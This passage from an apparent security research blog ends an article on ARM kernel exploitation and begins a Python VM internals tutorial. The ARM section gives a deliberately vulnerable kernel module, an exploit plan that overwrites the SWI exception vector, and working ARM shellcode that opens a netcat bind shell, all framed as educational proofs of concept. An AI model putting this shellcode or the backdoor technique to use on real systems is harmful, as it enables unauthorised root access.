</span><span class='line'>        <span class="n">where</span> <span class="o">=</span> <span class="p">((</span><span class="kt">void</span> <span class="o">**</span><span class="p">)</span><span class="n">tcp_data</span><span class="p">)[</span><span class="mi">0</span><span class="p">];</span>
</span><span class='line'>        <span class="n">len</span> <span class="o">=</span> <span class="p">((</span><span class="kt">uint8_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">tcp_data</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">where</span><span class="p">)))[</span><span class="mi">0</span><span class="p">];</span>
</span><span class='line'>        <span class="n">what</span> <span class="o">=</span> <span class="n">tcp_data</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">where</span><span class="p">)</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">len</span><span class="p">);</span>
</span><span class='line'>        <span class="n">memcpy</span><span class="p">(</span><span class="n">where</span><span class="p">,</span> <span class="n">what</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Just like the previous example, this module has an awesome feature that allows you to write data to anywhere you want. Connect on port tcp/9999 and just give it an address, followed by the size of the data and the actual data to write there. In this case we will also backdoor the kernel by overwriting the SWI exception vector and backdooring the kernel. The code will branch to our shellcode which we will also, as in the previous example, store at <em>0xffff020</em>. Overwriting the SWI vector is especially a good idea in this remote scenario because it will allow us to switch from interrupt context to process context. So our backdoor will be executing in a context with a backing process and we will be able to &ldquo;hijack&rdquo; this process and overwrite its code segment with a bind shell or connect back shell. But let&rsquo;s not do it that way. Let&rsquo;s check something real quick:<br/>
<img src="http://doar-e.github.io/images/corrupting_arm_evt/proc_self_maps.png" alt="cat /proc/self/maps" /><br/>
Would you look at that, on top of everything else, the EVT is a shared memory segment. It is executable from user land and writeable from kernel land*. Instead of overwriting the code segment of a process that is making a system call, let&rsquo;s just store our code in the EVT right after our first stage and just return there.
Every system call goes through the SWI vector so we won&rsquo;t have to wait too much for a process to get caught in our trap.</p>

<h3>The Exploit</h3>

<p>Our exploit goes:</p>

<pre><code>1. Store our first stage and second stage shellcodes at *0xffff0020* (one after the other).  
2. Overwrite the SWI exception vector with a branch to *0xffff0020*.  
3. When a system call occurs, our first stage shellcode will set the link register to the address of our second stage shellcode (which is also stored in the EVT and which will be executed from userland), and then return to userland.  
4. The calling process will "resume execution" at the address of our second stage which is just a bind shell.  
</code></pre>

<p>Here is the stage 1-2 shellcode:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
</pre></td><td class='code'><pre><code class='nasm'><span class='line'><span class="nl">stage_1:</span>
</span><span class='line'>    <span class="nf">adr</span>     <span class="nv">lr</span><span class="p">,</span> <span class="nv">stage_2</span>
</span><span class='line'>    <span class="nf">push</span>    <span class="err">{</span><span class="nv">lr</span><span class="err">}</span>
</span><span class='line'>    <span class="nf">stmfd</span>   <span class="nb">sp</span><span class="err">!</span><span class="p">,</span> <span class="err">{</span><span class="nv">r0</span><span class="o">-</span><span class="nv">r12</span><span class="err">}</span>
</span><span class='line'>    <span class="nf">ldr</span>     <span class="nv">r0</span><span class="p">,</span> <span class="err">=</span><span class="mh">0xe59ff410</span>     <span class="err">@</span> <span class="nv">intial</span> <span class="nv">value</span> <span class="nv">at</span> <span class="mh">0xffff0008</span> <span class="nv">which</span> <span class="nv">is</span>
</span><span class='line'>                                <span class="err">@</span> <span class="nf">ldr</span>     <span class="nv">pc</span><span class="p">,</span> <span class="p">[</span><span class="nv">pc</span><span class="p">,</span> <span class="err">#</span><span class="mi">1040</span><span class="p">]</span> <span class="c1">; 0xffff0420</span>
</span><span class='line'>    <span class="nf">ldr</span>     <span class="nv">r1</span><span class="p">,</span> <span class="err">=</span><span class="mh">0xffff0008</span>
</span><span class='line'>    <span class="nf">str</span>     <span class="nv">r0</span><span class="p">,</span> <span class="p">[</span><span class="nv">r1</span><span class="p">]</span>
</span><span class='line'>    <span class="nf">ldmfd</span>   <span class="nb">sp</span><span class="err">!</span><span class="p">,</span> <span class="err">{</span><span class="nv">r0</span><span class="o">-</span><span class="nv">r12</span><span class="p">,</span> <span class="nv">pc</span><span class="err">}</span><span class="o">^</span>  <span class="err">@</span> <span class="nv">return</span> <span class="nv">to</span> <span class="nv">userland</span>
</span><span class='line'>
</span><span class='line'><span class="nl">stage_2:</span>
</span><span class='line'>    <span class="nf">ldr</span>     <span class="nv">r0</span><span class="p">,</span> <span class="err">=</span><span class="mh">0x6e69622f</span>     <span class="err">@</span> <span class="o">/</span><span class="nv">bin</span>
</span><span class='line'>    <span class="nf">ldr</span>     <span class="nv">r1</span><span class="p">,</span> <span class="err">=</span><span class="mh">0x68732f2f</span>     <span class="err">@</span> <span class="o">/</span><span class="nv">sh</span>
</span><span class='line'>    <span class="nf">eor</span>     <span class="nv">r2</span><span class="p">,</span> <span class="nv">r2</span><span class="p">,</span> <span class="nv">r2</span>          <span class="err">@</span> <span class="mh">0x00000000</span>
</span><span class='line'>    <span class="nf">push</span>    <span class="err">{</span><span class="nv">r0</span><span class="p">,</span> <span class="nv">r1</span><span class="p">,</span> <span class="nv">r2</span><span class="err">}</span>
</span><span class='line'>    <span class="nf">mov</span>     <span class="nv">r0</span><span class="p">,</span> <span class="nb">sp</span>
</span><span class='line'>
</span><span class='line'>    <span class="nf">ldr</span>     <span class="nv">r4</span><span class="p">,</span> <span class="err">=</span><span class="mh">0x0000632d</span>     <span class="err">@</span> <span class="o">-</span><span class="nv">c</span><span class="err">\</span><span class="nv">x00</span><span class="err">\</span><span class="nv">x00</span>
</span><span class='line'>    <span class="nf">push</span>    <span class="err">{</span><span class="nv">r4</span><span class="err">}</span>
</span><span class='line'>    <span class="nf">mov</span>     <span class="nv">r4</span><span class="p">,</span> <span class="nb">sp</span>
</span><span class='line'>
</span><span class='line'>    <span class="nf">ldr</span>     <span class="nv">r5</span><span class="p">,</span> <span class="err">=</span><span class="mh">0x2d20636e</span>
</span><span class='line'>    <span class="nf">ldr</span>     <span class="nv">r6</span><span class="p">,</span> <span class="err">=</span><span class="mh">0x3820706c</span>
</span><span class='line'>    <span class="nf">ldr</span>     <span class="nv">r7</span><span class="p">,</span> <span class="err">=</span><span class="mh">0x20383838</span>     <span class="err">@</span> <span class="nv">nc</span> <span class="o">-</span><span class="nv">lp</span> <span class="mi">8888</span> <span class="o">-</span><span class="nv">e</span> <span class="o">/</span><span class="nv">bin</span><span class="o">//</span><span class="nv">sh</span>
</span><span class='line'>    <span class="nf">ldr</span>     <span class="nv">r8</span><span class="p">,</span> <span class="err">=</span><span class="mh">0x2f20652d</span>
</span><span class='line'>    <span class="nf">ldr</span>     <span class="nv">r9</span><span class="p">,</span> <span class="err">=</span><span class="mh">0x2f6e6962</span>
</span><span class='line'>    <span class="nf">ldr</span>     <span class="nv">r10</span><span class="p">,</span> <span class="err">=</span><span class="mh">0x68732f2f</span>
</span><span class='line'>
</span><span class='line'>    <span class="nf">eor</span>     <span class="nv">r11</span><span class="p">,</span> <span class="nv">r11</span><span class="p">,</span> <span class="nv">r11</span>
</span><span class='line'>    <span class="nf">push</span>    <span class="err">{</span><span class="nv">r5</span><span class="o">-</span><span class="nv">r11</span><span class="err">}</span>
</span><span class='line'>    <span class="nf">mov</span>     <span class="nv">r5</span><span class="p">,</span> <span class="nb">sp</span>
</span><span class='line'>    <span class="nf">push</span>    <span class="err">{</span><span class="nv">r2</span><span class="err">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="nf">eor</span>     <span class="nv">r6</span><span class="p">,</span> <span class="nv">r6</span><span class="p">,</span> <span class="nv">r6</span>
</span><span class='line'>    <span class="nf">push</span>    <span class="err">{</span><span class="nv">r0</span><span class="p">,</span><span class="nv">r4</span><span class="p">,</span><span class="nv">r5</span><span class="p">,</span> <span class="nv">r6</span><span class="err">}</span>
</span><span class='line'>    <span class="nf">mov</span>     <span class="nv">r1</span><span class="p">,</span> <span class="nb">sp</span>
</span><span class='line'>    <span class="nf">mov</span>     <span class="nv">r7</span><span class="p">,</span> <span class="err">#</span><span class="mi">11</span>
</span><span class='line'>    <span class="nf">swi</span>     <span class="mh">0x0</span>
</span><span class='line'>
</span><span class='line'>    <span class="nf">mov</span>     <span class="nv">r0</span><span class="p">,</span> <span class="err">#</span><span class="mi">99</span>
</span><span class='line'>    <span class="nf">mov</span>     <span class="nv">r7</span><span class="p">,</span> <span class="err">#</span><span class="mi">1</span>
</span><span class='line'>    <span class="nf">swi</span>     <span class="mh">0x0</span>
</span></code></pre></td></tr></table></div></figure>


<p>You can find the complete code for the vulnerable module and the exploit <a href="https://github.com/acama/arm-evt/tree/master/remote_example">here</a>. Run the exploit:<br/>
<img src="http://doar-e.github.io/images/corrupting_arm_evt/remote_poc.png" alt="Remote PoC" /></p>

<h2>Bonus: Interrupt Stack Overflow</h2>

<p>It seems like the Interrupt Stack is adjacent to the EVT in most memory layouts. Who knows what kind of interesting things would happen if there was something like a stack overflow ?</p>

<h1>A Few Things about all this</h1>

<ul>
<li>The techniques discussed in this article make the assumption that the attack has knowledge of the kernel addresses which might not always be the case.</li>
<li>The location where we are storing our shellcode (<em>0xffff0020</em>) might or might not be used by another distro&rsquo;s kernel.</li>
<li>The exampe codes I wrote here are merely PoCs; they could definitely be improved. For example, on the remote scenario, if it turns out that the init process is the process being hijacked, the box will crash after we exit from the bind shell.</li>
<li>If you hadn&rsquo;t noticed, the &ldquo;vulnerabilities&rdquo; presented here, aren&rsquo;t really vulnerabilities but that is not the point of this article.</li>
</ul>


<p> *: It seems like the EVT can be mapped read-only and therfore there is the possibility that it might not be writeable in newer/some versions of the Linux kernel.</p>

<h1>Final words</h1>

<p>Among other things, <a href="http://grsecurity.net/">grsec</a> prevents the modification of the EVT by making the page read-only.
If you want to play with some fun kernel challenges checkout the &ldquo;kernelpanic&rdquo; branch on <a href="http://w3challs.com/challenges/wargame">w3challs</a>.<br/>
Cheers, <a href="https://twitter.com/amatcama">@amatcama</a></p>

<h1>References</h1>

<p>[1] <a href="http://cansecwest.com/slides07/Vector-Rewrite-Attack.pdf">Vector Rewrite Attack</a><br/>
[2] <a href="https://forums.grsecurity.net/viewtopic.php?f=7&amp;t=3292">Recent ARM Security Improvements</a><br/>
[3] <a href="http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.ddi0311d/I30195.html">Entering an Exception</a><br/>
[4] <a href="http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.dui0040d/Cacdfeci.html">SWI handlers</a><br/>
[5] <a href="http://osnet.cs.nchu.edu.tw/powpoint/Embedded94_1/Chapter%207%20ARM%20Exceptions.pdf">ARM Exceptions</a><br/>
[6] <a href="http://www.iti.uni-stuttgart.de/~radetzki/Seminar06/08_report.pdf">Exception and Interrupt Handling in ARM</a></p>
]]></content>
    
  </entry>
  
  <entry>
    
    <title type="html"><![CDATA[Deep dive into Python's VM: Story of LOAD_CONST bug]]></title>
    <link href="http://doar-e.github.io/blog/2014/04/17/deep-dive-into-pythons-vm-story-of-load_const-bug/"/>
    
    <updated>2014-04-17T23:22:00+01:00</updated>
    <id>http://doar-e.github.io/blog/2014/04/17/deep-dive-into-pythons-vm-story-of-load_const-bug</id>
    
    <content type="html"><![CDATA[<h1>Introduction</h1>

<p>A year ago, I&rsquo;ve written a Python script to leverage a bug in Python&rsquo;s virtual machine: the idea was to fully control the Python virtual processor and after that to instrument the VM to execute native codes. The <a href="https://github.com/0vercl0k/stuffz/blob/master/Python's%20internals/python27_abuse_vm_to_execute_x86_code.py">python27_abuse_vm_to_execute_x86_code.py</a> script wasn&rsquo;t really self-explanatory, so I believe only a few people actually took some time to understood what happened under the hood. The purpose of this post is to give you an explanation of the bug, how you can control the VM and how you can turn the bug into something that can be more useful. It&rsquo;s also a cool occasion to see how works the Python virtual machine from a low-level perspective: what we love so much right?</p>

<p>But before going further, I just would like to clarify a couple of things:</p>

<ul>
<li>I haven&rsquo;t found this bug, this is quite old and <strong>known</strong> by the Python developers (trading safety for performance), so don&rsquo;t panic this is <strong>not</strong> a 0day or a new bug ; can be a cool CTF trick though</li>
<li>Obviously, YES I know we can also &ldquo;escape&rdquo; the virtual machine with the <a href="http://docs.python.org/2/library/ctypes.html">ctypes</a> module ; but this is a feature not a bug. In addition, ctypes is always &ldquo;removed&rdquo;  from sandbox implementation in Python</li>
</ul>


<p>Also, keep in mind I will focus Python 2.7.5 x86 on Windows ; but obviously this is adaptable for other systems and architectures, so this is left as an exercise to the interested readers.
All right, let&rsquo;s move on to the first part: this one will focus the essentials about the VM, and Python objects.</p>

<!--more-->


<h1>The Python virtual processor</h1>

<h2>Introduction</h2>

<p>As you know, Python is a (really cool) scripting language interpreted, and the source of the official interpreter is available here: <a href="http://www.python.org/ftp/python/2.7.6/Python-2.7.6.tgz">Python-2.7.6.tgz</a>. The project is written in C, and it is really readable ; so please download the sources, read them, you will learn a lot of things.
Now all the Python code you write is being <em>compiled</em>, at some point, into some &ldquo;bytecodes&rdquo;: let&rsquo;s say it&rsquo;s exactly the same when your C codes are compiled into x86 code. But the cool thing for us, is that the Python architecture is far more simpler than x86.</p>

<p>Here is a partial list of all available opcodes in Python 2.7.5:</p>

<figure class='code'><figcaption><span>Python275 available opcodes</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>In [5]: len(opcode.opmap.keys())
</span><span class='line'>Out[5]: 119
</span><span class='line'>In [4]: opcode.opmap.keys()
</span><span class='line'>Out[4]: [
</span><span class='line'> &#39;CALL_FUNCTION&#39;,
</span><span class='line'> &#39;DUP_TOP&#39;,
</span><span class='line'> &#39;INPLACE_FLOOR_DIVIDE&#39;,
</span><span class='line'> &#39;MAP_ADD&#39;,
</span><span class='line'> &#39;BINARY_XOR&#39;,
</span><span class='line'> &#39;END_FINALLY&#39;,
</span><span class='line'> &#39;RETURN_VALUE&#39;,
</span><span class='line'> &#39;POP_BLOCK&#39;,
</span><span class='line'> &#39;SETUP_LOOP&#39;,
</span><span class='line'> &#39;BUILD_SET&#39;,
</span><span class='line'> &#39;POP_TOP&#39;,
</span><span class='line'> &#39;EXTENDED_ARG&#39;,
</span><span class='line'> &#39;SETUP_FINALLY&#39;,
</span><span class='line'> &#39;INPLACE_TRUE_DIVIDE&#39;,
</span><span class='line'> &#39;CALL_FUNCTION_KW&#39;,
</span><span class='line'> &#39;INPLACE_AND&#39;,
</span><span class='line'> &#39;SETUP_EXCEPT&#39;,
</span><span class='line'> &#39;STORE_NAME&#39;,
</span><span class='line'> &#39;IMPORT_NAME&#39;,
</span><span class='line'> &#39;LOAD_GLOBAL&#39;,
</span><span class='line'> &#39;LOAD_NAME&#39;,
</span><span class='line'> ...
</span><span class='line'>]
</span></code></pre></td></tr></table></div></figure>


<h2>The virtual machine</h2>

<p>The Python VM is fully implemented in the function <a href="https://github.com/python-git/python/blob/master/Python/ceval.c#L667">PyEval_EvalFrameEx</a> that you can find in the <a href="https://github.com/python-git/python/blob/master/Python/ceval.c">ceval.c</a> file. The machine is built with a simple loop handling opcodes one-by-one with a bunch of switch-cases:</p>

<figure class='code'><figcaption><span>Python VM</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">PyObject</span> <span class="o">*</span>
</span><span class='line'><span class="nf">PyEval_EvalFrameEx</span><span class="p">(</span><span class="n">PyFrameObject</span> <span class="o">*</span><span class="n">f</span><span class="p">,</span> <span class="kt">int</span> <span class="n">throwflag</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="c1">//...</span>
</span><span class='line'>  <span class="nl">fast_next_opcode:</span>
</span><span class='line'>  <span class="c1">//...</span>
</span><span class='line'>  <span class="cm">/* Extract opcode and argument */</span>
</span><span class='line'>  <span class="n">opcode</span> <span class="o">=</span> <span class="n">NEXTOP</span><span class="p">();</span>
</span><span class='line'>  <span class="n">oparg</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">HAS_ARG</span><span class="p">(</span><span class="n">opcode</span><span class="p">))</span>
</span><span class='line'>    <span class="n">oparg</span> <span class="o">=</span> <span class="n">NEXTARG</span><span class="p">();</span>
</span><span class='line'>  <span class="c1">//...</span>
</span><span class='line'>  <span class="k">switch</span> <span class="p">(</span><span class="n">opcode</span><span class="p">)</span>
</span><span class='line'>  <span class="p">{</span>
</span><span class='line'>    <span class="k">case</span> <span class="n">NOP</span>:
</span><span class='line'>      <span class="k">goto</span> <span class="n">fast_next_opcode</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">case</span> <span class="n">LOAD_FAST</span>:
</span><span class='line'>      <span class="n">x</span> <span class="o">=</span> <span class="n">GETLOCAL</span><span class="p">(</span><span class="n">oparg</span><span class="p">);</span>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="n">x</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="n">Py_INCREF</span><span class="p">(</span><span class="n">x</span><span class="p">);</span>
</span><span class='line'>        <span class="n">PUSH</span><span class="p">(</span><span class="n">x</span><span class="p">);</span>
</span><span class='line'>        <span class="k">goto</span> <span class="n">fast_next_opcode</span><span class="p">;</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>      <span class="n">format_exc_check_arg</span><span class="p">(</span><span class="n">PyExc_UnboundLocalError</span><span class="p">,</span>
</span><span class='line'>        <span class="n">UNBOUNDLOCAL_ERROR_MSG</span><span class="p">,</span>
</span><span class='line'>        <span class="n">PyTuple_GetItem</span><span class="p">(</span><span class="n">co</span><span class="o">-&gt;</span><span class="n">co_varnames</span><span class="p">,</span> <span class="n">oparg</span><span class="p">));</span>
</span><span class='line'>      <span class="k">break</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">case</span> <span class="n">LOAD_CONST</span>:
</span><span class='line'>      <span class="n">x</span> <span class="o">=</span> <span class="n">GETITEM</span><span class="p">(</span><span class="n">consts</span><span class="p">,</span> <span class="n">oparg</span><span class="p">);</span>
</span><span class='line'>      <span class="n">Py_INCREF</span><span class="p">(</span><span class="n">x</span><span class="p">);</span>
</span><span class='line'>      <span class="n">PUSH</span><span class="p">(</span><span class="n">x</span><span class="p">);</span>
</span><span class='line'>      <span class="k">goto</span> <span class="n">fast_next_opcode</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">case</span> <span class="n">STORE_FAST</span>:
</span><span class='line'>      <span class="n">v</span> <span class="o">=</span> <span class="n">POP</span><span class="p">();</span>
</span><span class='line'>      <span class="n">SETLOCAL</span><span class="p">(</span><span class="n">oparg</span><span class="p">,</span> <span class="n">v</span><span class="p">);</span>
</span><span class='line'>      <span class="k">goto</span> <span class="n">fast_next_opcode</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">//...</span>
</span><span class='line'>  <span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>The machine also uses a virtual stack to pass/return object to the different opcodes. So it really looks like an architecture we are used to dealing with, nothing exotic.</p>

<h2>Everything is an object</h2>

<p>The first rule of the VM is that it handles only Python objects. A Python object is basically made of two parts:</p>

<ul>
<li>The first one is a header, this header is mandatory for all the objects. Defined like that:</li>
</ul>


<figure class='code'><figcaption><span>Python object header</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#define PyObject_HEAD                   \</span>
</span><span class='line'><span class="cp">  _PyObject_HEAD_EXTRA                \</span>
</span><span class='line'><span class="cp">  Py_ssize_t ob_refcnt;               \</span>
</span><span class='line'><span class="cp">  struct _typeobject *ob_type;</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#define PyObject_VAR_HEAD               \</span>
</span><span class='line'><span class="cp">  PyObject_HEAD                       \</span>
</span><span class='line'><span class="cp">  Py_ssize_t ob_size; </span><span class="cm">/* Number of items in variable part */</span><span class="cp"></span>
</span></code></pre></td></tr></table></div></figure>


<ul>
<li>The second one is the variable part that describes the specifics of your object. Here is for example <em>PyStringObject</em>:</li>
</ul>


<figure class='code'><figcaption><span>PyStringObject</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
</span><span class='line'>  <span class="n">PyObject_VAR_HEAD</span>
</span><span class='line'>  <span class="kt">long</span> <span class="n">ob_shash</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">ob_sstate</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">ob_sval</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>  <span class="cm">/* Invariants:</span>
</span><span class='line'><span class="cm">   *     ob_sval contains space for &#39;ob_size+1&#39; elements.</span>
</span><span class='line'><span class="cm">   *     ob_sval[ob_size] == 0.</span>
</span><span class='line'><span class="cm">   *     ob_shash is the hash of the string or -1 if not computed yet.</span>
</span><span class='line'><span class="cm">   *     ob_sstate != 0 iff the string object is in stringobject.c&#39;s</span>
</span><span class='line'><span class="cm">   *       &#39;interned&#39; dictionary; in this case the two references</span>
</span><span class='line'><span class="cm">   *       from &#39;interned&#39; to this object are *not counted* in ob_refcnt.</span>
</span><span class='line'><span class="cm">   */</span>
</span><span class='line'><span class="p">}</span> <span class="n">PyStringObject</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now, some of you may ask themselves &ldquo;How does Python know the type of an object when it receives a pointer ?&rdquo;. In fact, this is exactly the role of the field <em>ob_type</em>. Python exports a <em>_typeobject</em> static variable that describes the type of the object. Here is, for instance the <em>PyString_Type</em>:</p>

<figure class='code'><figcaption><span>PyString_Type</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">PyTypeObject</span> <span class="n">PyString_Type</span> <span class="o">=</span> <span class="p">{</span>
</span><span class='line'>  <span class="n">PyVarObject_HEAD_INIT</span><span class="p">(</span><span class="o">&amp;</span><span class="n">PyType_Type</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
</span><span class='line'>  <span class="s">&quot;str&quot;</span><span class="p">,</span>
</span><span class='line'>  <span class="n">PyStringObject_SIZE</span><span class="p">,</span>
</span><span class='line'>  <span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">),</span>
</span><span class='line'>  <span class="n">string_dealloc</span><span class="p">,</span>                             <span class="cm">/* tp_dealloc */</span>
</span><span class='line'>  <span class="p">(</span><span class="n">printfunc</span><span class="p">)</span><span class="n">string_print</span><span class="p">,</span>                    <span class="cm">/* tp_print */</span>
</span><span class='line'>  <span class="mi">0</span><span class="p">,</span>                                          <span class="cm">/* tp_getattr */</span>
</span><span class='line'>  <span class="c1">// ...</span>
</span><span class='line'><span class="p">};</span>
</span></code></pre></td></tr></table></div></figure>


<p>Basically, every string objects will have their <em>ob_type</em> fields pointing to that <em>PyString_Type</em> variable. With this cute little trick, Python is able to do type checking like that:</p>

<figure class='code'><figcaption><span>PyString_Check PyString_CheckExact</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#define Py_TYPE(ob)             (((PyObject*)(ob))-&gt;ob_type)</span>
</span><span class='line'><span class="cp">#define PyType_HasFeature(t,f)  (((t)-&gt;tp_flags &amp; (f)) != 0)</span>
</span><span class='line'><span class="cp">#define PyType_FastSubclass(t,f)  PyType_HasFeature(t,f)</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#define PyString_Check(op) \</span>
</span><span class='line'><span class="cp">  PyType_FastSubclass(Py_TYPE(op), Py_TPFLAGS_STRING_SUBCLASS)</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#define PyString_CheckExact(op) (Py_TYPE(op) == &amp;PyString_Type)</span>
</span></code></pre></td></tr></table></div></figure>


<p>With the previous tricks, and the <em>PyObject</em> type defined as follow, Python is able to handle in a generic-fashion the different objects:</p>

<figure class='code'><figcaption><span>PyObject</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">typedef</span> <span class="k">struct</span> <span class="n">_object</span> <span class="p">{</span>
</span><span class='line'>  <span class="n">PyObject_HEAD</span>
</span><span class='line'><span class="p">}</span> <span class="n">PyObject</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>So when you are in your debugger and you want to know what type of object it is, you can use that field to identify easily the type of the object you are dealing with:</p>

<figure class='code'><figcaption><span>ob_type really useful when debugging</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>0:000&gt; dps 026233b0 l2
</span><span class='line'>026233b0  00000001
</span><span class='line'>026233b4  1e226798 python27!PyString_Type
</span></code></pre></td></tr></table></div></figure>


<p>Once you have done that, you can dump the variable part describing your object to extract the information you want.
